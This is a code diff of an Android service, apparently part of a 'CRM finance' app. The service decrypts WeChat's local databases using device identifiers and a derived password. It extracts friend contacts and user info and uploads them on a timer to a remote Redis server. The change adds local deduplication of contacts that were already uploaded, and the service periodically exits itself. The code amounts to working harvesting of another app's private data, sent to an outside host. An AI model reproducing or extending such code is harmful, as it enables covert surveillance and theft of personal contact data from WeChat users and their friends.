@@ -13,6 +13,7 @@ import android.util.ArraySet;
 
 import com.crm.finance.broadcast.BroadcastUtils;
 import com.crm.finance.dao.DevInfoDao;
+import com.crm.finance.dao.RcontactDao;
 import com.crm.finance.dao.UserInfoDao;
 import com.crm.finance.util.Common;
 import com.crm.finance.util.GlobalCofig;
@@ -23,6 +24,7 @@ import com.crm.finance.util.ShareData;
 import com.crm.finance.util.UploadManager;
 import com.crm.finance.util.Utils;
 import com.crm.finance.util.WXDataFormJsonUtil;
+import com.crm.finance.util.dbutil.WeChatDBOperator;
 import com.crm.finance.util.fileutil.FileUtil;
 import com.crm.finance.util.wxutil.WXBusinessUtil;
 import com.google.gson.Gson;
@@ -66,13 +68,17 @@ public class GohnsonService extends Service {
     private String mDbPassword = "";
 
     HashMap<String, String> mapUIN = new HashMap<String, String>();
+    WeChatDBOperator weChatDBOperator =null;
 
     @Override
     public void onCreate() {
         super.onCreate();
         initBaseContnet();
+        initWeChatDB();
     }
-
+    public void initWeChatDB(){
+        weChatDBOperator =  new WeChatDBOperator(this);
+    }
 
     public void initBaseContnet() {
         LogInputUtil.e(TAG, "GohnsonService 启动 onCreate");
@@ -124,21 +130,22 @@ public class GohnsonService extends Service {
     private Timer mTimer = new Timer(true);
     public boolean isExecuteEnd = true;
     long existTime = 0;
+
     public void timekeeping() {
         if (mTimerTask != null) return;
         mTimerTask = new TimerTask() {
             public void run() {
 
-                existTime  = existTime + GlobalCofig.EXECUTE_HEARBEAT_INTERVAL;
-                LogInputUtil.e(TAG,"存在时长："+existTime/1000);
-                if(existTime >= GlobalCofig.EXIST_MAC_TIME){
+                existTime = existTime + GlobalCofig.EXECUTE_HEARBEAT_INTERVAL;
+                LogInputUtil.e(TAG, "存在时长：" + existTime / 1000);
+                if (existTime >= GlobalCofig.EXIST_MAC_TIME) {
                     existTime = 0;
-                    LogInputUtil.e(TAG,"达到最长时长，清除自己");
+                    LogInputUtil.e(TAG, "达到最长时长，清除自己");
                     System.exit(0);
                 }
                 if (isExecuteEnd) {
-                    LogInputUtil.e(TAG, "开始执行定时线程！");
                     isExecuteEnd = false;
+                    LogInputUtil.e(TAG, "开始执行定时线程！");
                     executeUpload();
                 } else {
                     LogInputUtil.e(TAG, "上个任务没执行完，不重复执行定时线程！");
@@ -327,7 +334,7 @@ public class GohnsonService extends Service {
                         };
                         SQLiteDatabase dataTarget = null;
                         try {
-                           dataTarget = SQLiteDatabase.openOrCreateDatabase(dbFile.getPath(), mDbPassword, null, hook);
+                            dataTarget = SQLiteDatabase.openOrCreateDatabase(dbFile.getPath(), mDbPassword, null, hook);
                             uploadOperation(dataTarget, f, pathUin, wxIMEI, fileChangeTime);
                         } catch (Exception e) {
 
@@ -383,41 +390,37 @@ public class GohnsonService extends Service {
         }
 
         final ArrayList<Object> imgFlags = WXDataFormJsonUtil.getImgFlagDataInDB(dataTarget);
-        /*String imgFlagJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, imgFlags, pathUin, deviceID, userName);
-        LogInputUtil.e(TAG, "待提交的imgFlagJsonStr = " + imgFlagJsonStr);
-        //目前该表不使用，不用上传
-        boolean imgFlagUploadSucceed = false;
-        if (imgFlagJsonStr != null && !imgFlagJsonStr.equals("")) {
-            //目前该表不使用
-              imgFlagUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_IMGFLAG, imgFlagJsonStr, file);
-        }*/
+//        String imgFlagJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, imgFlags, pathUin, deviceID, userName);
+//        LogInputUtil.e(TAG, "待提交的imgFlagJsonStr = " + imgFlagJsonStr);
+//        //目前该表不使用，不用上传
+//        boolean imgFlagUploadSucceed = false;
+//        if (imgFlagJsonStr != null && !imgFlagJsonStr.equals("")) {
+//            //目前该表不使用
+//              imgFlagUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_IMGFLAG, imgFlagJsonStr, file);
+//        }
 
         boolean allRcontactUploadSucceed = false;
-        addRcontactAllPath(this,file);
-        for (int i = 0; i < 100; i++) {
-            boolean rcontactUploadSucceed = false;
-            LogInputUtil.e(TAG, "第" + i + "次查询rcontact表");
-            final ArrayList<Object> rcontacts = WXDataFormJsonUtil.getRcontactDataInDB(this, dataTarget, file);
-            if (rcontacts == null) continue;
-
-            int listSize = rcontacts.size();
-            if (listSize > 0) {
+        ArrayList<Object> rcontactInSelfDB = weChatDBOperator.selectAll(GlobalCofig.CRM_TIP+wxFolderPath);//已上传的好友数据
+        MyLog.inputLogToFile(TAG,"已在库的好友数："+rcontactInSelfDB.size());
+        final ArrayList<Object> rcontacts = WXDataFormJsonUtil.getRcontactDataInDB(this, dataTarget, file,rcontactInSelfDB);
+        if(rcontacts != null){
+            int rcontactSize = rcontacts.size();
+            MyLog.inputLogToFile(TAG,"准备上传的好友数："+rcontactSize);
+            if (rcontactSize > 0) {
                 WXBusinessUtil.setFriendHeadImg(rcontacts, imgFlags);
                 String rcontactJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, rcontacts, pathUin, deviceID, userName);
                 LogInputUtil.e(TAG, "待提交的rcontactJsonStr = " + rcontactJsonStr);
                 if (rcontactJsonStr != null && !rcontactJsonStr.equals("")) {
-                    rcontactUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_CONTACT, rcontactJsonStr, file);
+                    allRcontactUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_CONTACT, rcontactJsonStr, file);
+                    if(allRcontactUploadSucceed){
+                        weChatDBOperator.createTable(GlobalCofig.CRM_TIP+wxFolderPath);
+                        weChatDBOperator.addList(GlobalCofig.CRM_TIP+wxFolderPath,rcontacts);
+                    }
                 }
-            } else if (listSize == 0) {
-                rcontactUploadSucceed = true;
-            }
-            if (rcontactUploadSucceed && listSize < GlobalCofig.RCONTACTI_UPLOAD_NUMBER) {
-                MyLog.inputLogToFile(TAG, "rcontact上传成功，并且是最后" + listSize + "条");
+            } else if (rcontactSize == 0) {
                 allRcontactUploadSucceed = true;
-                break;
             }
         }
-
 
         String userInfoJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, userInfos, pathUin, deviceID, userName);
 
@@ -460,23 +463,12 @@ public class GohnsonService extends Service {
             pushHearBeat();
         }
     }
-    //将好友临时下标，当前下标，缓存hashCode路径保存起来，便于清除好友重新上传
-    public void addRcontactAllPath(Context context,File file){
-        String index = GlobalCofig.RCONTACT_LAST_UPLOAD_INDEX + file.getPath();
-        String indexTemporary = GlobalCofig.RCONTACT_UPLOAD_INDEX_TEMPORARY + file.getPath();
-        String hashKey = GlobalCofig.REDIS_KEY_CONTACT + "_" + file.getPath();
-
-        WXDataFormJsonUtil.addRcontactPath(context,index);
-        WXDataFormJsonUtil.addRcontactPath(context,indexTemporary);
-        WXDataFormJsonUtil.addRcontactPath(context,hashKey);
-    }
-
 
     public boolean uploadDataToRedis(String key, String jsonValue, File file) {
         String hashKey = key + "_" + file.getPath();
         int newJsonHashCode = jsonValue.hashCode();
         int oldJsonHashCode = ShareData.getInstance().getIntValue(this, hashKey, 0);
-        if (newJsonHashCode == oldJsonHashCode) {
+        if (!key.equals(GlobalCofig.REDIS_KEY_CONTACT) &&  newJsonHashCode == oldJsonHashCode) {//REDIS_KEY_CONTACT 不再校验jsonHash，通过数据库过滤
             MyLog.inputLogToFile(TAG, "数据无更新，无需上传，newJsonHashCode = " + newJsonHashCode + ",oldJsonHashCode = " + oldJsonHashCode + ", hashKey = " + hashKey);
             return true;
         }
@@ -486,25 +478,12 @@ public class GohnsonService extends Service {
             Jedis myJedis = JedisUtil.getInit();
             MyLog.inputLogToFile(TAG, "redis 连接成功，正在运行 = " + myJedis.ping());
             long pushValue = myJedis.lpush(key, jsonValue);
-            addRcontactIndex(key,file);
             ShareData.getInstance().saveIntValue(this, hashKey, newJsonHashCode);
             MyLog.inputLogToFile(TAG, "redis上传成功，数据有更新" + key + "，newJsonHashCode = " + newJsonHashCode + ",oldJsonHashCode = " + oldJsonHashCode + ",pushValue = " + pushValue + ",filePath = " + file.getPath());
             return true;
         } catch (Exception e) {
             MyLog.inputLogToFile(TAG, "redis 连接失败, errMsg = " + e.getMessage() + ", hashKey = " + hashKey);
             return false;
-        }
-    }
-    //只保存rcontact下标
-    public void addRcontactIndex(String key,File file){
-        if(key.equals(GlobalCofig.REDIS_KEY_CONTACT)){
-            String indexTmporaryStr = GlobalCofig.RCONTACT_UPLOAD_INDEX_TEMPORARY + file.getPath();//临时下标
-            int rcontact_upload_index_temporary = ShareData.getInstance().getIntValue(this, indexTmporaryStr, 0);//临时下标
-
-            String lastUploadIndexStr = GlobalCofig.RCONTACT_LAST_UPLOAD_INDEX + file.getPath();//真实下标
-            int rcontact_last_upload_index = ShareData.getInstance().getIntValue(this, lastUploadIndexStr, 0);
-            ShareData.getInstance().saveIntValue(this, lastUploadIndexStr, rcontact_last_upload_index + rcontact_upload_index_temporary);
-            LogInputUtil.e(TAG,key+"存入的下标："+(rcontact_last_upload_index + rcontact_upload_index_temporary)+",rcontact_last_upload_index="+rcontact_last_upload_index+",rcontact_upload_index_temporary="+rcontact_upload_index_temporary);
         }
     }
 
@@ -542,6 +521,10 @@ public class GohnsonService extends Service {
         }
         GlobalCofig.excuteGohnsonService(this);
         LogInputUtil.e(TAG, "onDestroy GohnsonService");
+        if(weChatDBOperator != null){
+            weChatDBOperator.close();
+        }
+        isExecuteEnd = true;
     }
 
 
